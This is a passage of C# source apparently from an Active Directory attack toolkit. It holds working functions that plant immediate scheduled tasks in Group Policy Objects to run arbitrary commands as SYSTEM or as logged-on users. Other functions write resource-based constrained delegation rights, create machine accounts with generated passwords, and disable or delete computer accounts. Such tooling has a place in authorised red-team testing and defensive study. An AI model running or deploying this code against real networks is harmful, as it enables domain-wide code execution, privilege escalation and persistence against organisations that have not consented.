                        mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
                    } else
                    {
                        List<String> lExt = new List<String>();
                        if (!sMachExt.Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
                        {
                            lExt.Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
                        }

                        lExt.Add(sMachExt);

                        // Build new string
                        String sNewMachExt = String.Empty;
                        foreach (String s in lExt)
                        {
                            sNewMachExt += s;
                        }
                        mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
                    }
                } else
                {
                    Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
                    mde.Properties["gPCMachineExtensionNames"].Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
                }
                mde.CommitChanges();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed modify GPO..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void GPOAddImmediateTask(String sGPOName, String sTaskType, String sAuthor, String sCommand, String sTaskName = "", String sArgs = "", String sTarget = "", String sTargetSID = "", String sDomain = "", String sUser = "", String sPass = "")
        {
            // Setup
            String sTaskPath = String.Empty;
            if (sTaskType.ToLower() == "user")
            {
                sTaskType = "user";
                sTaskPath = @"\User\Preferences\ScheduledTasks\";
            } else if (sTaskType.ToLower() == "computer")
            {
                sTaskType = "computer";
                sTaskPath = @"\Machine\Preferences\ScheduledTasks\";
            } else
            {
                Console.WriteLine("\n[!] Invalid task type, user/computer..");
                return;
            }

            if (String.IsNullOrEmpty(sTaskName))
            {
                sTaskName = hStandIn.genAccountPass();
            }

            String sTaskContent = String.Empty;
            if (sTaskType == "user")
            {
                if (String.IsNullOrEmpty(sTarget))
                {
                    sTaskContent = String.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString());
                } else
                {
                    sTaskContent = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterUser bool=""AND"" not=""0"" name=""{5}"" sid=""{6}""/></Filters></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString(), sTarget, sTargetSID);
                }
                
            } else
            {
                if (String.IsNullOrEmpty(sTarget))
                {
                    sTaskContent = String.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString());
                } else
                {
                    sTaskContent = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterComputer bool=""AND"" not=""0"" type=""DNS"" name=""{5}""/></Filters></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString(), sTarget);
                }
                
            }

            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("\n[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("\n[!] LDAP search did not return any results..");
                    return;
                }
                else if (oObject.Count > 1)
                {
                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
                    return;
                }

                SearchResult dirGPOObject = oObject[0];
                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
                ResultPropertyCollection omProps = dirGPOObject.Properties;

                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
                Console.WriteLine("\n[+] GPO Object Found");
                Console.WriteLine("    Object   : " + mde.Name);
                Console.WriteLine("    Path     : " + mde.Path);
                Console.WriteLine("    GP Path  : " + sGPOPath);

                // Read GPO version information
                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
                Console.WriteLine("\n[?] GPO Version");
                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);

                if (!Directory.Exists(sGPOPath))
                {
                    Console.WriteLine("\n[!] GPO path not found..");
                    return;
                }

                // Read gpt.ini
                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
                UInt32 iNewGPOVersion = 0;
                if (sTaskType == "user")
                {
                    iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, true, false);
                }
                else
                {
                    iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
                }
                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));

                // Check/create relevant path
                if (!Directory.Exists(sGPOPath + sTaskPath))
                {
                    try
                    {
                        Directory.CreateDirectory(sGPOPath + sTaskPath);
                    }
                    catch
                    {
                        Console.WriteLine("\n[!] Failed to create GPO path..");
                        return;
                    }
                }

                Console.WriteLine("\n[+] Writing GPO changes");
                if (File.Exists(sGPOPath + sTaskPath + "ScheduledTasks.xml"))
                {
                    Console.WriteLine("    |_ Updating existing ScheduledTasks.xml");
                    String sTmpl = File.ReadAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml");

                    if ((sTmpl.ToLower()).Contains("</scheduledtasks>"))
                    {
                        Console.WriteLine("       |_ Updating GPO Privileges");
                        MatchCollection mc = Regex.Matches(sTmpl, "name=\\\"" + sTaskName + "\\\"");
                        if (mc.Count > 0)
                        {
                            Console.WriteLine("       |_ A scheduled task with that name already exists..");
                            return;
                        }
                        else
                        {
                            // Ok here we just add the priv
                            String sReplace = sTaskContent + @"</ScheduledTasks>";
                            sTmpl = Regex.Replace(sTmpl, @"<\/(S|s)cheduled(T|t)asks>", sReplace);
                        }
                    }
                    else
                    {
                        // We overwrite the file here
                        Console.WriteLine("       |_ Adding XML task structure");
                        sTmpl = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">" + sTaskContent + @"</ScheduledTasks>";
                    }

                    File.WriteAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml", sTmpl);
                }
                else
                {
                    Console.WriteLine("    |_ Creating ScheduledTasks.xml");
                    String sGptTemplate = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">" + sTaskContent + @"</ScheduledTasks>";

                    File.WriteAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml", sGptTemplate);
                }

                Console.WriteLine("    |_ Updating gpt.inf");
                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
                Console.WriteLine("    |_ Updating AD object");
                Console.WriteLine("       |_ Incrementing version number");
                if (sTaskType == "user")
                {
                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, true, false)).ToString();

                    if (dirGPOObject.Properties.Contains("gPCUserExtensionNames"))
                    {
                        Console.WriteLine("       |_ Updating gPCUserExtensionNames");
                        String sMachExt = omProps["gPCUserExtensionNames"][0].ToString();
                        MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
                        if (mc.Count == 0)
                        {
                            mde.Properties["gPCUserExtensionNames"].Value = sMachExt + "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
                        }
                        else
                        {
                            List<String> lExt = new List<String>();
                            if (!sMachExt.Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
                            {
                                lExt.Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                            }

                            if (!sMachExt.Contains("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
                            {
                                lExt.Add("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                            }

                            lExt.Add(sMachExt);

                            // Build new string
                            String sNewMachExt = String.Empty;
                            foreach (String s in lExt)
                            {
                                sNewMachExt += s;
                            }
                            mde.Properties["gPCUserExtensionNames"].Value = sNewMachExt;
                        }
                    }
                    else
                    {
                        Console.WriteLine("       |_ Creating gPCUserExtensionNames");
                        mde.Properties["gPCUserExtensionNames"].Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                    }
                } else
                {
                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();

                    if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
                    {
                        Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
                        String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
                        MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
                        if (mc.Count == 0)
                        {
                            mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
                        }
                        else
                        {
                            List<String> lExt = new List<String>();
                            if (!sMachExt.Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
                            {
                                lExt.Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                            }

                            if (!sMachExt.Contains("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
                            {
                                lExt.Add("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                            }

                            lExt.Add(sMachExt);

                            // Build new string
                            String sNewMachExt = String.Empty;
                            foreach (String s in lExt)
                            {
                                sNewMachExt += s;
                            }
                            mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
                        }
                    }
                    else
                    {
                        Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
                        mde.Properties["gPCMachineExtensionNames"].Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
                    }
                }
                
                mde.CommitChanges();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed modify GPO..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void GPOObjectIncCounter(String sGPOName, String sTaskType, String sDomain = "", String sUser = "", String sPass = "")
        {
            sTaskType = sTaskType.ToLower();
            if (sTaskType != "user" && sTaskType != "computer")
            {
                Console.WriteLine("\n[!] Invalid task type, user/computer..");
                return;
            }

            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("\n[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("\n[!] LDAP search did not return any results..");
                    return;
                }
                else if (oObject.Count > 1)
                {
                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
                    return;
                }

                SearchResult dirGPOObject = oObject[0];
                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
                ResultPropertyCollection omProps = dirGPOObject.Properties;

                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
                Console.WriteLine("\n[+] GPO Object Found");
                Console.WriteLine("    Object   : " + mde.Name);
                Console.WriteLine("    Path     : " + mde.Path);
                Console.WriteLine("    GP Path  : " + sGPOPath);

                // Read GPO version information
                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
                Console.WriteLine("\n[?] Current GPO Versioning");
                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);

                if (sTaskType == "user")
                {
                    Console.WriteLine("\n--> Incrementing user version");
                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, true, false)).ToString();
                } else
                {
                    Console.WriteLine("\n--> Incrementing computer version");
                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();
                }

                mde.CommitChanges();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed modify GPO..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void setAllowedToActOnBehalfOfOtherIdentity(String sMachineName, String sObjectSID, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass, true);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(samaccountname={0}$)", sMachineName);

            // Act
            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Host not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    // Check if msDS-AllowedToActOnBehalfOfOtherIdentity exists bail if yes, set if not
                    if (sr.Properties.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
                    {
                        Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity property..");
                        return;
                    } else
                    {
                        RawSecurityDescriptor rs = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sObjectSID + ")");
                        Byte[] bDescriptor = new byte[rs.BinaryLength];
                        rs.GetBinaryForm(bDescriptor, 0);
                        mde.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Add(bDescriptor);
                        mde.CommitChanges();
                        Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to set host msDS-AllowedToActOnBehalfOfOtherIdentity property..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void removeAllowedToActOnBehalfOfOtherIdentity(String sMachineName, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass, true);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(samaccountname={0}$)", sMachineName);

            // Act
            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Host not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    // Check if msDS-AllowedToActOnBehalfOfOtherIdentity remove if yes, bail if not
                    if (sr.Properties.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
                    {
                        mde.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Clear();
                        mde.CommitChanges();
                        Console.WriteLine("[+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..");
                    }
                    else
                    {
                        Console.WriteLine("[!] This host does not have a msDS-AllowedToActOnBehalfOfOtherIdentity property..");
                        return;
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to remove host msDS-AllowedToActOnBehalfOfOtherIdentity property..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void LDAPMakeMachineAccount(String sMachineName, String sDomain = "", String sUser = "", String sPass = "")
        {
            // We can't set the machine unicodePwd using DirectoryEntry so
            // we use LdapConnection but it's is less friendly..
            try
            {
                Domain oDom = Domain.GetComputerDomain();
                String sPDC = oDom.PdcRoleOwner.Name;

                String sDomName = oDom.Name;
                String sDistName = "CN=" + sMachineName + ",CN=Computers";
                foreach (String sPart in sDomName.ToLower().Split(new Char[] { '.' }))
                {
                    sDistName += ",DC=" + sPart;
                }
                Console.WriteLine("\n[?] Using DC    : " + sPDC);
                Console.WriteLine("    |_ Domain   : " + sDomName);
                Console.WriteLine("    |_ DN       : " + sDistName);

                // Are we supplying creds?
                NetworkCredential credObj = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    credObj = new NetworkCredential(sUser, sPass, sDomain);
                }

                // Create connection object
                LdapDirectoryIdentifier oConId = new LdapDirectoryIdentifier(sPDC, 389);
                LdapConnection oConObject = null;
                if (credObj != null)
                {
                    oConObject = new LdapConnection(oConId, credObj);
                } else
                {
                    oConObject = new LdapConnection(oConId);
                }

                // Initiate an LDAP bind
                oConObject.SessionOptions.Sealing = true; // Encrypt and sign our
                oConObject.SessionOptions.Signing = true; // session traffic
                oConObject.Bind();

                // Create machine object
                AddRequest oLDAPReq = new AddRequest();
                oLDAPReq.DistinguishedName = sDistName;
                oLDAPReq.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("SamAccountName", sMachineName + "$"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("DnsHostName", sMachineName + "." + sDomName));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", new String[] { "HOST/" + sMachineName + "." + sDomName, "RestrictedKrbHost/" + sMachineName + "." + sDomName, "HOST/" + sMachineName, "RestrictedKrbHost/" + sMachineName }));

                // Set machine password
                String sMachinePass = hStandIn.genAccountPass();
                Console.WriteLine("    |_ Password : " + sMachinePass);
                oLDAPReq.Attributes.Add(new DirectoryAttribute("unicodePwd", System.Text.Encoding.Unicode.GetBytes('"' + sMachinePass + '"')));

                // Send request
                try
                {
                    oConObject.SendRequest(oLDAPReq);
                    Console.WriteLine("\n[+] Machine account added to AD..");
                } catch (Exception ex)
                {
                    Console.WriteLine("\n[!] Failed to add machine account to AD..");
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("    |_ " + ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("    |_ " + ex.Message);
                    }
                }
            } catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain properties..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void disableMachineAccount(String sMachineName, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(samaccountname={0}$)", sMachineName);

            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Host not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    // retrieve object properties
                    ResultPropertyCollection omProps = sr.Properties;

                    // Check and disable machine account
                    Int32 iAcctCon = (Int32)omProps["userAccountControl"][0];
                    Boolean isAccountEnabled = !Convert.ToBoolean(iAcctCon & 0x0002);
                    if (isAccountEnabled)
                    {
                        Console.WriteLine("\n[+] Machine account currently enabled");
                        try
                        {
                            mde.Properties["userAccountControl"].Value = iAcctCon | 0x2;
                            mde.CommitChanges();
                            Console.WriteLine("    |_ Account disabled..");
                        } catch
                        {
                            Console.WriteLine("\n[!] Failed to disable machine account..");
                        }
                    } else
                    {
                        Console.WriteLine("\n[+] Machine account already disabled");
                        Console.WriteLine("    |_ Exiting..");
                    }
                }
            } catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain object..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void deleteMachineAccount(String sMachineName, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(samaccountname={0}$)", sMachineName);

            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Host not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
